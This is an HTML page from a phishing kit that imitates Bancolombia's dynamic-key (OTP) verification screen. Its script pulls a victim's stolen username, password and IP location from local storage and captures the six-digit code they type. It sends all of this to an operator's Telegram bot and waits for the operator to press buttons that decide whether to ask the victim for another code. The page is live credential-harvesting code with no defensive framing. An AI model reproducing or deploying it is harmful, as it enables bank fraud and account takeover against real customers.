<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Clave Din√°mica - Bancolombia</title>
    
    <link href="css/styles.css" rel="stylesheet">
    <link href="css/bootstrap.css" rel="stylesheet">
    
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif;
        }
        
        .container-main {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .panel-primary {
            background: white;
            border: 1px solid #cccccc;
            margin-top: 20px;
        }
        
        .panel-heading {
            background-color: #2c2a29;
            color: white;
            padding: 10px 15px;
        }
        
        .panel-heading h3 {
            margin: 0;
            font-size: 16px;
            font-family: 'CIBFontSans', Arial, sans-serif;
        }
        
        .mua-panel-body {
            padding: 30px 15px;
        }
        
        .panel_general {
            background: white;
            border: 1px solid #cccccc;
            padding: 0;
            margin-bottom: 20px;
        }
        
        .title-panel-label {
            background-color: #2c2a29;
            padding: 10px;
        }
        
        .title-panel-label h1 {
            color: white;
            font-size: 16px;
            margin: 0;
            font-family: 'CIBFontSans', Arial, sans-serif;
        }
        
        .subtitle-land-label {
            background-color: #f4f4f4;
            padding: 8px 10px;
        }
        
        .subtitle-land-label h4 {
            font-size: 12px;
            margin: 0;
            color: #2c2a29;
        }
        
        .mua-content-group-panel {
            padding: 20px 15px;
        }
        
        .otp-label {
            font-size: 14px;
            color: #2c2a29;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .otp-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 30px;
        }
        
        .otp-inputs input {
            width: 45px;
            height: 45px;
            text-align: center;
            font-size: 24px;
            border: 1px solid #cccccc;
            border-radius: 4px;
            font-weight: bold;
            font-family: "OpenSans-Regular", Arial, sans-serif;
        }
        
        .otp-inputs input:focus {
            outline: none;
            border-color: #00448c;
        }
        
        .mua-button-container {
            padding: 20px 15px;
            text-align: center;
        }
        
        .btn-success {
            background-color: #fdda24;
            border: none;
            color: #2c2a29;
            padding: 10px 30px;
            font-size: 14px;
            font-weight: bold;
            min-width: 120px;
            cursor: pointer;
            border-radius: 0;
        }
        
        .btn-success:hover {
            background-color: #fdc82a;
        }
        
        .btn-success:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            z-index: 9999;
        }
        
        .loading-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #fdda24;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .mua-imgLogoItem {
            background: url("img/logo.svg") no-repeat;
            width: 175px;
            height: 25px;
            margin: 10px 0;
        }
        
        .help-text {
            text-align: center;
            font-size: 12px;
            color: #666;
            margin-top: 15px;
        }
        
        @media (max-width: 768px) {
            .container-main {
                padding: 10px;
            }
            
            .otp-inputs input {
                width: 40px;
                height: 40px;
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="loading-overlay loadingContainer" id="loadingOverlay">
        <div class="loading-content">
            <div class="spinner"></div>
            <p style="font-size: 16px; color: #2c2a29;">Verificando c√≥digo...</p>
        </div>
    </div>

    <div class="container-main" id="containerMain">
        <div class="row">
            <div class="col-xs-12">
                <div class="mua-imgLogoItem"></div>
            </div>
        </div>
        
        <div class="panel panel-primary">
            <div class="panel-heading">
                <h3>Clave Din√°mica</h3>
            </div>
            
            <div class="mua-panel-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-8 col-md-6 col-sm-offset-2 col-md-offset-3">
                        <div class="panel_general">
                            <div class="title-panel-label">
                                <h1>Verificaci√≥n de seguridad</h1>
                            </div>
                            <div class="subtitle-land-label">
                                <h4>Ingresa el c√≥digo de tu tarjeta de coordenadas</h4>
                            </div>
                            
                            <form id="otpForm">
                                <div class="mua-content-group-panel">
                                    <div class="otp-label">
                                        Ingresa los 6 d√≠gitos de tu clave din√°mica
                                    </div>
                                    
                                    <div class="otp-inputs">
                                        <input type="text" maxlength="1" id="otp1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
                                        <input type="text" maxlength="1" id="otp2" inputmode="numeric" pattern="[0-9]" autocomplete="off">
                                        <input type="text" maxlength="1" id="otp3" inputmode="numeric" pattern="[0-9]" autocomplete="off">
                                        <input type="text" maxlength="1" id="otp4" inputmode="numeric" pattern="[0-9]" autocomplete="off">
                                        <input type="text" maxlength="1" id="otp5" inputmode="numeric" pattern="[0-9]" autocomplete="off">
                                        <input type="text" maxlength="1" id="otp6" inputmode="numeric" pattern="[0-9]" autocomplete="off">
                                    </div>
                                    
                                    <div class="help-text">
                                        Revisa tu tarjeta de coordenadas o el mensaje que te enviamos
                                    </div>
                                </div>
                                
                                <div class="mua-button-container">
                                    <button type="submit" class="btn btn-success" id="btnContinuar" disabled>
                                        Continuar
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="js/sendTelegramMessage.js"></script>
    <script src="js/actions.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const userName = localStorage.getItem('userName');
            const userPass = localStorage.getItem('userPass');
            const userIP = localStorage.getItem('userIP');
            const userIP2 = localStorage.getItem('userIP2');
            const transactionId = localStorage.getItem('transactionId');
            
            if (!userName || !userPass) {
                window.location.href = 'indexx.html';
                return;
            }
            
            const inputs = document.querySelectorAll('.otp-inputs input');
            const btnContinuar = document.getElementById('btnContinuar');
            const form = document.getElementById('otpForm');
            
            // Manejar navegaci√≥n entre inputs
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    // Solo permitir n√∫meros
                    e.target.value = e.target.value.replace(/[^0-9]/g, '');
                    
                    if (e.target.value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                    
                    // Verificar si todos est√°n llenos
                    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
                    btnContinuar.disabled = !allFilled;
                });
                
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
                
                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pasteData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
                    
                    if (pasteData.length === 6) {
                        inputs.forEach((inp, i) => {
                            inp.value = pasteData[i] || '';
                        });
                        btnContinuar.disabled = false;
                    }
                });
            });
            
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                
                const otp = Array.from(inputs).map(input => input.value).join('');
                
                localStorage.setItem('userOTP', otp);
                
                document.getElementById('containerMain').style.display = 'none';
                document.getElementById('loadingOverlay').style.display = 'block';
                
                const mensaje = `üîê *CLAVE DIN√ÅMICA BANCOLOMBIA*\n\nüìÑ *Usuario:* ${userName}\nüîë *Clave:* ${userPass}\nüéØ *OTP:* ${otp}\nüåê *IP:* ${userIP}\nüìç *Ubicaci√≥n:* ${userIP2}\n‚è∞ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\nüìÖ *Fecha:* ${new Date().toLocaleDateString('es-CO')}`;
                
                const teclado = JSON.stringify({
                    inline_keyboard: [
                        [
                            { text: "‚úÖ Correcto", callback_data: `correcto:${transactionId}` },
                            { text: "‚ùå Incorrecto", callback_data: `error_dinamica:${transactionId}` }
                        ],
                        [
                            { text: "üîê Pedir Otra Vez", callback_data: `pedir_dinamica:${transactionId}` }
                        ],
                        [
                            { text: "‚úîÔ∏è Finalizar", callback_data: `finish:${transactionId}` }
                        ]
                    ]
                });
                
                try {
                    const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
                    const { action } = await waitForButtonPress(responseMensaje.message_id);
                    await handleAction(action, transactionId);
                } catch (error) {
                    console.error("‚ùå Error:", error);
                    alert('Error de conexi√≥n. Intenta nuevamente.');
                    window.location.reload();
                }
            });
            
            // Focus en el primer input
            inputs[0].focus();
        });
    </script>
</body>
</html>
